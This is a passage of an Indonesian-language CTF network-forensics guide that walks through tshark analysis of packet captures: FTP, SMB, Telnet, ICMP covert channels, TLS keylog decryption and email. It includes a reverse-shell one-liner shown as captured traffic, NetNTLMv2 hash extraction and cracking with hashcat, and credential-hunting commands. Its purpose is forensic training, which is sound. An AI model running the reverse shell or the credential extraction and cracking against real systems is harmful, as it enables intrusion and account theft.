total 0
```

➡️ FTP pakai Active mode atau data channel di-capture terpisah. Gunakan cara manual:

Bash

```
# Method 2: Manual stream reconstruction
# Step 1: Cari stream TCP yang membawa ftp-data
tshark -r $PCAP -Y 'ftp-data' -T fields -e tcp.stream | sort -nu

# Step 2: Extract stream yang ketemu (misal stream 3)
STREAM_NUM=3
tshark -r $PCAP -q -z "follow,tcp,raw,$STREAM_NUM" \
    | tail -n +7 \
    | head -n -1 \
    | xxd -r -p \
    > ~/pcap_loot/extracted/ftp/recovered_stream$STREAM_NUM.bin

file ~/pcap_loot/extracted/ftp/recovered_stream$STREAM_NUM.bin

# Method 3: tcpflow (ekstrak semua stream sekaligus)
mkdir -p ~/pcap_loot/extracted/tcpflow
tcpflow -r $PCAP -o ~/pcap_loot/extracted/tcpflow/ -a

# Identifikasi file yang menarik (>1KB)
for f in ~/pcap_loot/extracted/tcpflow/*; do
    size=$(stat -c%s "$f" 2>/dev/null)
    [ "$size" -gt 1000 ] && echo "[$size bytes] $(file "$f") | $f"
done
```

**Setelah file terekstrak:**

Bash

```
# Analisis semua file hasil ekstraksi
for f in ~/pcap_loot/extracted/ftp/*; do
    echo "=== $f ==="
    file "$f"
    strings "$f" | grep -iE "(flag|password|secret|key)" | head -5
done
```

---

## ═══════════════════════════════════════

## FASE 5: SMB ANALYSIS & NTLM HASH EXTRACTION

## ═══════════════════════════════════════

> **Masuk sini jika:** Protocol hierarchy menunjukkan `smb2` atau `smb`

### Langkah 5.1 — SMB File Export

Bash

```
# Command 1: Lihat file apa yang diakses via SMB
tshark -r $PCAP -Y 'smb2.cmd == 5' \
    -T fields -e frame.number -e ip.src -e ip.dst -e smb2.filename | awk 'NF' | sort -u

# Command 2: Export semua file SMB
mkdir -p ~/pcap_loot/extracted/smb
tshark -r $PCAP --export-objects "smb,~/pcap_loot/extracted/smb" -q

# Command 3: Cek executable yang ditransfer (malware indicator)
tshark -r $PCAP -Y 'smb2.filename contains ".exe" || smb2.filename contains ".ps1" || smb2.filename contains ".bat"' \
    -T fields -e ip.src -e smb2.filename
```

**OUTPUT BERHASIL ✅ — File SMB terdeteksi:**

text

```
45    192.168.1.105    192.168.1.200    Users\Administrator\Desktop\secret.txt
46    192.168.1.105    192.168.1.200    Users\Administrator\Desktop\flag.txt
```

---

### Langkah 5.2 — NTLM Hash Extraction

Bash

```
# Command 1: Filter NTLM authentication messages
# Type 1 = Negotiate, Type 2 = Challenge (server), Type 3 = Auth (client - INI YANG KITA MAU)
tshark -r $PCAP -Y 'ntlmssp.messagetype == 3' \
    -T fields \
    -e ntlmssp.auth.username \
    -e ntlmssp.auth.domain \
    -e ntlmssp.ntlmresponse \
    | tee ~/pcap_loot/creds/ntlm_raw.txt

# Command 2: Dapatkan server challenge (dari type 2)
tshark -r $PCAP -Y 'ntlmssp.messagetype == 2' \
    -T fields -e ntlmssp.ntlmserverchallenge
```

**OUTPUT BERHASIL ✅:**

text

```
# Type 3 (Auth):
diana    CORP    4e4e4e4e4e4e4e4e:xxxxxxxx...

# Type 2 (Challenge):
0102030405060708
```

➡️ Format NetNTLMv2 untuk Hashcat:

text

```
diana::CORP:0102030405060708:4e4e4e4e4e4e4e4e:xxxxxxxx...
```

Bash

```
# Buat hash file yang siap untuk hashcat
echo "diana::CORP:0102030405060708:4e4e4e4e4e4e4e4e:NTLMRESPONSE_HEX" \
    > ~/pcap_loot/creds/netntlmv2.hash

# Crack dengan hashcat (mode 5600 = NetNTLMv2)
hashcat -m 5600 ~/pcap_loot/creds/netntlmv2.hash /usr/share/wordlists/rockyou.txt

# Atau dengan john
john ~/pcap_loot/creds/netntlmv2.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅ — Hash cracked:**

text

```
diana::CORP:...:Welcome2023!
Session..........: hashcat
Status...........: Cracked
```

➡️ Password `Welcome2023!` → test ke service lain → `<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`

---

## ═══════════════════════════════════════

## FASE 6: TELNET ANALYSIS (Keystroke Reconstruction)

## ═══════════════════════════════════════

> **Masuk sini jika:** Protocol hierarchy menunjukkan `telnet`

### Langkah 6.1 — Follow Telnet Stream

Bash

```
# Command 1: Cek ada berapa stream Telnet
tshark -r $PCAP -Y 'tcp.dstport == 23 || tcp.srcport == 23' \
    -T fields -e tcp.stream | sort -nu

# Command 2: Follow stream secara ASCII (quick look)
tshark -r $PCAP -q -z "follow,tcp,ascii,0" | head -50
```

**OUTPUT BERHASIL ✅ — Telnet stream terlihat:**

text

```
login: admin
Password: secret123
Last login: Mon Oct 18 10:14:02 2023

$ ls -la
total 28
-rw-r--r-- 1 root root   42 Oct 18 10:12 flag.txt
$ cat flag.txt
flag{telnet_is_never_secure_2024}
```

➡️ **FLAG DITEMUKAN!** Tapi jika output berantakan karena backspace...

**OUTPUT GAGAL ❌ — Output berantakan (backspace characters):**

text

```
admmiin\x08\x08in
seccret1\x08\x0823
```

➡️ Gunakan script Python untuk reconstruct keystrokes:

Bash

```
# Simpan script telnet reassembler
cat > ~/pcap_loot/scripts/telnet_reassemble.py << 'SCRIPT'
#!/usr/bin/env python3
import sys
from scapy.all import rdpcap, TCP

def reassemble_telnet(pcap_file):
    packets = rdpcap(pcap_file)
    streams = {}
    
    for pkt in packets:
        if pkt.haslayer(TCP) and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
            stream_id = (pkt[TCP].sport, pkt[TCP].dport)
            raw_payload = bytes(pkt[TCP].payload)
            if not raw_payload:
                continue
            if pkt[TCP].dport == 23:  # Client -> Server only
                if stream_id not in streams:
                    streams[stream_id] = []
                streams[stream_id].append(raw_payload)
    
    for conn, chunks in streams.items():
        print(f"\n[+] Telnet Session [Port: {conn[0]}]:")
        buffer = []
        for chunk in chunks:
            if chunk.startswith(b'\xff'):  # Skip IAC telnet commands
                continue
            for byte in chunk:
                if byte in (8, 127):  # Backspace
                    if buffer: buffer.pop()
                elif byte in (10, 13):  # Enter
                    line = "".join(buffer)
                    if line.strip():
                        print(f"  CMD> {line}")
                    buffer = []
                elif 32 <= byte <= 126:  # Printable ASCII
                    buffer.append(chr(byte))
        if buffer:
            print(f"  CMD> {''.join(buffer)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pcap>")
        sys.exit(1)
    reassemble_telnet(sys.argv[1])
SCRIPT

python3 ~/pcap_loot/scripts/telnet_reassemble.py $PCAP
```

**OUTPUT BERHASIL ✅ — Setelah reconstruction:**

text

```
[+] Telnet Session [Port: 52341]:
  CMD> admin
  CMD> secret123
  CMD> ls -la
  CMD> cat flag.txt
```

---

## ═══════════════════════════════════════

## FASE 7: ICMP COVERT CHANNEL

## ═══════════════════════════════════════

> **Masuk sini jika:** Protocol hierarchy menunjukkan `icmp` dengan sublayer `data`, atau `data.len > 32`

### Langkah 7.1 — Deteksi ICMP Anomali

Bash

```
# Command 1: Ukuran payload ICMP (standar Linux = 56 bytes, Windows = 32 bytes)
tshark -r $PCAP -Y 'icmp.type == 8' \
    -T fields -e frame.number -e ip.src -e ip.dst -e data.len | head -20

# Command 2: Lihat payload hex
tshark -r $PCAP -Y 'icmp.type == 8 && data.len > 48' \
    -T fields -e frame.number -e ip.src -e data.data | head -10

# Command 3: Hitung total ICMP echo requests
tshark -r $PCAP -Y 'icmp.type == 8' | wc -l
```

**OUTPUT BERHASIL ✅ — ICMP anomali terdeteksi:**

text

```
# data.len > 100 bytes = tidak normal
142    192.168.1.105    10.10.10.1    892
143    192.168.1.105    10.10.10.1    892

# Payload hex (bukan standard ping padding):
4d5a9000...   ← MZ header = Windows executable!
504b0304...   ← PK header = ZIP file!
```

---

### Langkah 7.2 — ICMP Payload Extraction

Bash

```
# Method 1: Extract via tshark
tshark -r $PCAP -Y 'icmp.type == 8 && data.len > 0' \
    -T fields -e data.data \
    | tr -d '\n ' \
    | xxd -r -p \
    > ~/pcap_loot/extracted/icmp_payload.bin

file ~/pcap_loot/extracted/icmp_payload.bin
strings ~/pcap_loot/extracted/icmp_payload.bin | head -20
```

**OUTPUT BERHASIL ✅ — File teridentifikasi:**

text

```
~/pcap_loot/extracted/icmp_payload.bin: Zip archive data, at least v2.0 to extract
```

➡️ Extract ZIP:

Bash

```
cp ~/pcap_loot/extracted/icmp_payload.bin /tmp/icmp_recovered.zip
unzip /tmp/icmp_recovered.zip -d /tmp/icmp_content/
ls /tmp/icmp_content/
cat /tmp/icmp_content/flag.txt 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Strings flag:**

text

```
flag{icmp_tunnel_data_exfiltrated}
```

**OUTPUT GAGAL ❌ — Binary tidak dikenal / garbled:**

text

```
~/pcap_loot/extracted/icmp_payload.bin: data
```

➡️ Mungkin perlu skip timestamp header (8/16 bytes pertama):

Bash

```
# Skip 8 byte pertama (timestamp area) lalu coba lagi
dd if=~/pcap_loot/extracted/icmp_payload.bin of=/tmp/icmp_skip8.bin bs=1 skip=8 2>/dev/null
file /tmp/icmp_skip8.bin
strings /tmp/icmp_skip8.bin | grep -i flag

# Atau gunakan binwalk untuk carve
binwalk -e ~/pcap_loot/extracted/icmp_payload.bin
```

---

## ═══════════════════════════════════════

## FASE 8: TLS/HTTPS DECRYPTION

## ═══════════════════════════════════════

> **Masuk sini jika:** Traffic dominan TLS dan ada file keylog

### Langkah 8.1 — Cek Kemungkinan Dekripsi

Bash

```
# Cek ada berapa TLS sessions
tshark -r $PCAP -Y 'tls.handshake.type == 1' \
    -T fields -e ip.dst -e tls.handshake.extensions_server_name | sort -u

# Cek TLS versi
tshark -r $PCAP -Y 'tls.handshake.type == 1' \
    -T fields -e tls.handshake.version | sort | uniq -c

# Apakah ada file keylog di challenge?
ls -la *.log *.txt keys* ssl* 2>/dev/null
find . -name "*.log" -o -name "*keylog*" -o -name "*ssl*" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Keylog file ada:**

text

```
-rw-r--r-- 1 user user 12340 Oct 18 challenge_sslkeylog.txt
```

➡️ Decrypt dengan keylog:

Bash

```
export KEYLOG="challenge_sslkeylog.txt"

# Method 1: tshark CLI
tshark -r $PCAP -o "tls.keylog_file:$KEYLOG" -Y 'http' \
    -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri \
    | head -30

# Cari flag setelah decrypt
tshark -r $PCAP -o "tls.keylog_file:$KEYLOG" \
    -Y 'http.response' -T fields -e http.file_data \
    | grep -i flag

# Method 2: Wireshark GUI
# Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename → pilih keylog file
```

**OUTPUT BERHASIL ✅ — Traffic terdekripsi:**

text

```
192.168.1.105    GET    secure-site.com    /secret/flag.php
# Di response:
{"flag": "flag{tls_decrypted_with_keylog_file}"}
```

**OUTPUT GAGAL ❌ — Tidak ada keylog file (common situation):**

text

```
(keylog file tidak ada di challenge)
```

➡️ Tanpa keylog, TLS tidak bisa didekripsi. Tapi masih bisa:

Bash

```
# 1. Lihat SNI (domain yang dikunjungi)
tshark -r $PCAP -Y 'tls.handshake.extensions_server_name' \
    -T fields -e ip.dst -e tls.handshake.extensions_server_name | sort -u

# 2. Lihat certificate info
tshark -r $PCAP -Y 'tls.handshake.certificate' \
    -T fields -e ip.src -e x509af.subjectAltName.dNSName | sort -u

# 3. JA3 fingerprint (identifikasi client/server software)
tshark -r $PCAP -Y 'tls.handshake.type == 1' \
    -T fields -e tls.handshake.ciphersuite | sort | uniq -c | sort -rn
```

---

## ═══════════════════════════════════════

## FASE 9: REVERSE SHELL / CUSTOM TCP ANALYSIS

## ═══════════════════════════════════════

> **Masuk sini jika:** Ada traffic ke port non-standar (4444, 1337, 31337, 9001, dll)

### Langkah 9.1 — Identifikasi Port Non-Standar

Bash

```
# Command 1: Semua port yang aktif
tshark -r $PCAP -T fields -e tcp.dstport | sort -n | uniq -c | sort -rn | head -20

# Command 2: Port yang tidak biasa (exclude standard ports)
tshark -r $PCAP -Y 'tcp.dstport > 1024 && tcp.dstport != 8080 && tcp.dstport != 8443 && tcp.dstport != 3306' \
    -T fields -e tcp.dstport | sort | uniq -c | sort -rn | head -10
```

**OUTPUT BERHASIL ✅ — Port mencurigakan:**

text

```
  245    4444     ← Metasploit default port!
   12    1337     ← Leet port = custom tool
```

Bash

```
# Follow stream port mencurigakan
SUSPICIOUS_PORT=4444

# Lihat TCP stream number
tshark -r $PCAP -Y "tcp.dstport == $SUSPICIOUS_PORT || tcp.srcport == $SUSPICIOUS_PORT" \
    -T fields -e tcp.stream | sort -nu

# Follow stream
STREAM=0   # Ganti dengan stream number yang ditemukan
tshark -r $PCAP -q -z "follow,tcp,ascii,$STREAM" | head -100
```

**OUTPUT BERHASIL ✅ — Reverse shell session:**

text

```
bash -i >& /dev/tcp/192.168.1.105/4444 0>&1

whoami
www-data

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /root/flag.txt
flag{reverse_shell_captured_in_pcap}

ls /home
alice
bob
```

➡️ **FLAG DITEMUKAN!**

---

## ═══════════════════════════════════════

## FASE 10: EMAIL ANALYSIS (SMTP/POP3/IMAP)

## ═══════════════════════════════════════

> **Masuk sini jika:** Protocol hierarchy menunjukkan `smtp`, `pop`, atau `imap`

### Langkah 10.1 — SMTP Credential & Content Extraction

Bash

```
# Command 1: SMTP authentication
tshark -r $PCAP -Y 'smtp.req.command == "AUTH"' \
    -T fields -e ip.src -e smtp.req.command -e smtp.req.parameter

# Command 2: Email metadata
tshark -r $PCAP -Y 'smtp' -T fields -e smtp.req.command -e smtp.req.parameter \
    | grep -iE "(FROM|TO|Subject)"

# Command 3: Dump semua email conversations
tshark -r $PCAP -Y 'smtp.req.command == "DATA"' -T fields -e tcp.stream \
    | sort -nu | while read -r stream; do
        echo "=== Email Stream $stream ==="
        tshark -r $PCAP -q -z "follow,tcp,ascii,$stream" | head -80
    done
```

**OUTPUT BERHASIL ✅ — SMTP auth (BASE64 encoded):**

text

```
192.168.1.105    AUTH    LOGIN
192.168.1.105    AUTH    YWRtaW4=          ← base64
192.168.1.105    AUTH    UGFzc3dvcmQxMjM=  ← base64
```

Bash

```
# Decode SMTP auth
echo "YWRtaW4=" | base64 -d      # = admin
echo "UGFzc3dvcmQxMjM=" | base64 -d  # = Password123
```

### Langkah 10.2 — Email Attachment Extraction

Bash

```
# Export email objects
mkdir -p ~/pcap_loot/extracted/smtp
tshark -r $PCAP --export-objects "imf,~/pcap_loot/extracted/smtp" -q

ls -la ~/pcap_loot/extracted/smtp/

# Manual extraction dari stream
# 1. Dump stream yang berisi DATA command
tshark -r $PCAP -q -z "follow,tcp,ascii,0" > /tmp/email_dump.txt

# 2. Extract Base64 attachment
grep -A 9999 "Content-Transfer-Encoding: base64" /tmp/email_dump.txt \
    | grep -v "Content-" \
    | grep -v "^--" \
    | tr -d '\r\n' \
    | base64 -d > ~/pcap_loot/extracted/smtp/attachment.bin

file ~/pcap_loot/extracted/smtp/attachment.bin
```

---

## ═══════════════════════════════════════

## FASE 11: ADVANCED — COVERT CHANNELS LAINNYA

## ═══════════════════════════════════════

### Pattern A — TCP Sequence Number Covert Channel

Bash

```
# Beberapa CTF menyembunyikan data di TCP ISN (Initial Sequence Number)
python3 << 'EOF'
from scapy.all import rdpcap, TCP
import sys

packets = rdpcap("challenge.pcap")

# Method 1: ISN sebagai ASCII
chars_ascii = []
for pkt in packets:
    if pkt.haslayer(TCP) and pkt[TCP].flags == "S":
        seq = pkt[TCP].seq
        char_val = seq % 128
        if 32 <= char_val <= 126:
            chars_ascii.append(chr(char_val))

if chars_ascii:
    print(f"[ASCII from ISN] {''.join(chars_ascii)}")

# Method 2: ISN sebagai raw bytes
raw_bytes = bytes([pkt[TCP].seq % 256 
                   for pkt in packets 
                   if pkt.haslayer(TCP) and pkt[TCP].flags == "S"])
print(f"[Raw ISN bytes] {raw_bytes[:50]}")
print(f"[Printable] {raw_bytes.decode('ascii', errors='replace')[:50]}")
EOF
```

**OUTPUT BERHASIL ✅:**

text

```
[ASCII from ISN] flag{hidden_in_tcp_sequence_numbers}
```

### Pattern B — HTTP Header Covert Channel

Bash

```
# Flag tersembunyi di custom HTTP headers
tshark -r $PCAP -Y 'http.request' -T fields -e http.request.line | sort -u | head -30

# Cari header tidak standard
tshark -r $PCAP -Y 'http' -T pdml 2>/dev/null | grep -iE "(X-Flag|X-Secret|X-Data|X-Custom)" | head -10
```

### Pattern C — SNMP Community String

Bash

```
# SNMP community strings (sering jadi credentials)
tshark -r $PCAP -Y 'snmp' -T fields -e ip.src -e snmp.community | sort -u

# OIDs yang diquery
tshark -r $PCAP -Y 'snmp' -T fields -e snmp.name | sort -u | head -20
```

---

## ═══════════════════════════════════════

## FASE 12: AUTOMATION — JALANKAN SEMUA SEKALIGUS

## ═══════════════════════════════════════

Bash

```
# Script triage otomatis — jalankan di awal sebelum analisis manual
cat > ~/pcap_loot/scripts/pcap_triage.sh << 'TRIAGE'
#!/bin/bash
PCAP="$1"
[ -z "$PCAP" ] && echo "Usage: $0 <file.pcap>" && exit 1

echo "======================================================"
echo "  PCAP TRIAGE REPORT: $PCAP"
echo "======================================================"

echo -e "\n[1] METADATA"
capinfos -c -s -d "$PCAP" 2>/dev/null

echo -e "\n[2] PROTOCOL HIERARCHY"
tshark -r "$PCAP" -q -z io,phs 2>/dev/null

echo -e "\n[3] TOP IP CONVERSATIONS"
tshark -r "$PCAP" -q -z conv,ip 2>/dev/null | head -10

echo -e "\n[4] INSTANT FLAG SEARCH"
FLAGS=$(tshark -r "$PCAP" \
    -Y 'frame contains "flag{" || frame contains "FLAG{" || frame contains "picoCTF{" || frame contains "HTB{"' \
    -T fields -e frame.number -e text 2>/dev/null)
[ -n "$FLAGS" ] && echo "[!!] FLAGS FOUND: $FLAGS" || echo "[-] No plaintext flags found"

echo -e "\n[5] CREDENTIAL HUNTING"
echo "  FTP:"
tshark -r "$PCAP" -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
    -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null | sed 's/^/    /'

echo "  HTTP Basic Auth:"
tshark -r "$PCAP" -Y 'http.authorization contains "Basic"' \
    -T fields -e http.authorization 2>/dev/null | \
    awk '{print $2}' | sort -u | while read b64; do
        echo "    Encoded: $b64 | Decoded: $(echo $b64 | base64 -d 2>/dev/null)"
    done

echo "  NTLM:"
tshark -r "$PCAP" -Y 'ntlmssp.messagetype == 3' \
    -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain 2>/dev/null | sed 's/^/    /'

echo -e "\n[6] ANOMALY DETECTION"
DNS_COUNT=$(tshark -r "$PCAP" -Y 'dns.flags.response == 0' 2>/dev/null | wc -l)
LONG_DNS=$(tshark -r "$PCAP" -Y 'dns.flags.response == 0' -T fields -e dns.qry.name 2>/dev/null | awk 'length($1) > 50' | wc -l)
echo "  DNS Queries: $DNS_COUNT (Long queries >50 chars: $LONG_DNS)"
[ "$LONG_DNS" -gt 5 ] && echo "  [!!] DNS TUNNELING SUSPECTED!"

ICMP_BIG=$(tshark -r "$PCAP" -Y 'icmp.type == 8 && data.len > 48' 2>/dev/null | wc -l)
echo "  Oversized ICMP: $ICMP_BIG"
[ "$ICMP_BIG" -gt 0 ] && echo "  [!!] ICMP COVERT CHANNEL SUSPECTED!"

echo -e "\n[7] EXPERT INFO"
tshark -r "$PCAP" -q -z expert 2>/dev/null | head -10

echo -e "\n======================================================"
echo "  Triage complete. Check each section above."
echo "======================================================"
TRIAGE

chmod +x ~/pcap_loot/scripts/pcap_triage.sh
bash ~/pcap_loot/scripts/pcap_triage.sh $PCAP
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`Permission denied` saat capture|User tidak di group wireshark|`sudo usermod -aG wireshark $USER` lalu logout/login|
|File PCAP corrupt|Transfer gagal atau disk error|`pcapfix target.pcap -o fixed.pcap`|
|Export objects = 0 files|Gzip compression atau HTTPS|Enable `Uncompress entity bodies` di Wireshark preferences|
|Follow Stream = binary acak|Stream terenkripsi atau compressed|Ubah mode ke `Raw`, save as binary, cek dengan `file`|
|TShark field `-e` kosong|Field name salah|`tshark -G fields|
|`[Packet size limited]`|Capture pakai snaplen kecil|Payload terpotong permanen, hanya bisa analisis header|
|Telnet output berantakan|Backspace chars di-render raw|Gunakan `telnet_reassemble.py`|
|DNS decode gagal|Bukan Base64/Hex standar|Coba Base32, XOR, atau custom encoding|
|Wireshark freeze|PCAP terlalu besar (>500MB)|Pecah dulu: `tshark -r big.pcap -Y 'http' -w http_only.pcap`|
|TLS tidak bisa decrypt|Keylog tidak cover session ini|Cek Client Random match di keylog|
|`tshark: -T fields requires -e`|Lupa tambahkan field|Tambah `-e ip.src` minimal satu field|
|File hasil extract rusak|Stream disimpan mode ASCII bukan Raw|Gunakan mode Raw saat Follow Stream|

---

## MASTER DECISION TREE (RINGKASAN)

text

```
START: File PCAP Diterima
│
├─ FASE 0: Triage Awal (WAJIB)
│   ├─ capinfos → metadata, durasi, packet count
│   ├─ tshark -z io,phs → protocol hierarchy
│   ├─ Quick flag grep → jika ketemu, SELESAI
│   └─ tshark -z conv,ip → top talkers
│
├─ FASE 2: HTTP dominant
│   ├─ [Credentials POST/Basic Auth] → Simpan, reuse ke service lain
│   ├─ [File exported] → Analisis, cek stego jika image
│   └─ [HTTPS tanpa keylog] → ke Fase 8
│
├─ FASE 3: DNS anomali (>500 query satu domain)
│   ├─ [Panjang query >50 chars] → DNS Tunneling
│   └─ [Base64/Hex decode] → File tersembunyi
│
├─ FASE 4: FTP ada
│   ├─ [Credentials plaintext] → USER/PASS langsung keliatan
│   └─ [ftp-data stream] → Reconstruct file yang ditransfer
│
├─ FASE 5: SMB/SMB2
│   ├─ [File access] → Export SMB objects
│   └─ [NTLM auth] → Extract hash → crack → reuse
│
├─ FASE 6: Telnet
│   └─ [Keystroke stream] → Follow TCP → reconstruct commands
│
├─ FASE 7: ICMP dengan data
│   └─ [Payload >48 bytes] → Extract → file recovery
│
├─ FASE 8: TLS dominant
│   ├─ [Keylog file ada] → Decrypt langsung
│   └─ [Tidak ada keylog] → Analisis SNI, JA3, certificate only
│
├─ FASE 9: Custom port (4444, 1337, etc)
│   └─ [Follow TCP stream] → Reverse shell commands
│
└─ FASE 10: Email (SMTP/POP3/IMAP)
    ├─ [Auth BASE64] → Decode → credentials
    └─ [DATA attachment] → Extract BASE64 → file
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export PCAP="challenge.pcap"
mkdir -p ~/pcap_loot/{files,creds,extracted,scripts}

# === TRIAGE ===
capinfos $PCAP
tshark -r $PCAP -q -z io,phs
tshark -r $PCAP -q -z conv,ip | head -15
tshark -r $PCAP -q -z expert | head -15

# === QUICK FLAG HUNT ===
strings $PCAP | grep -iE "(flag|ctf|htb|thm)\{"
tshark -r $PCAP -Y 'frame contains "flag{"' -T fields -e frame.number -e text

# === HTTP ===
tshark -r $PCAP -Y 'http.request' -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri
tshark -r $PCAP -Y 'http.request.method == "POST"' -T fields -e http.file_data
tshark -r $PCAP --export-objects "http,./http_dump" -q

# === DNS TUNNELING ===
tshark -r $PCAP -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | awk 'length($1)>50' | sort -u

# === FTP ===
tshark -r $PCAP -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' -T fields -e ftp.request.command -e ftp.request.arg
tshark -r $PCAP --export-objects "ftp-data,./ftp_dump" -q

# === NTLM HASH ===
tshark -r $PCAP -Y 'ntlmssp.messagetype == 3' -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmresponse
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt

# === SMB FILES ===
tshark -r $PCAP --export-objects "smb,./smb_dump" -q

# === TELNET ===
tshark -r $PCAP -q -z "follow,tcp,ascii,0"

# === ICMP PAYLOAD ===
tshark -r $PCAP -Y 'icmp.type == 8 && data.len > 0' -T fields -e data.data | tr -d '\n ' | xxd -r -p > icmp.bin
file icmp.bin

# === TLS DECRYPT (jika ada keylog) ===
tshark -r $PCAP -o "tls.keylog_file:keys.log" -Y 'http' -T fields -e http.request.uri

# === TCP STREAM EXTRACT ===
tshark -r $PCAP -Y 'tcp' -T fields -e tcp.stream | sort -nu   # list streams
tshark -r $PCAP -q -z "follow,tcp,ascii,0"                     # follow stream 0

# === STREAM TO BINARY ===
tshark -r $PCAP -q -z "follow,tcp,raw,0" | tail -n +7 | head -n -1 | xxd -r -p > stream0.bin
```

---

> **➡️ NEXT:** Setelah analisis PCAP selesai dan flag ditemukan atau artifacts di-extract, lanjut ke **`[🧠 Bagian 0: Fondasi Memory Forensics](/docs/memory-forensics)`** jika challenge memberikan memory dump, atau ke **`[🏛️ Bagian 0: Fondasi Steganography](/docs/steganography)`** jika ditemukan file gambar/audio yang mencurigakan dari hasil ekstraksi HTTP/FTP.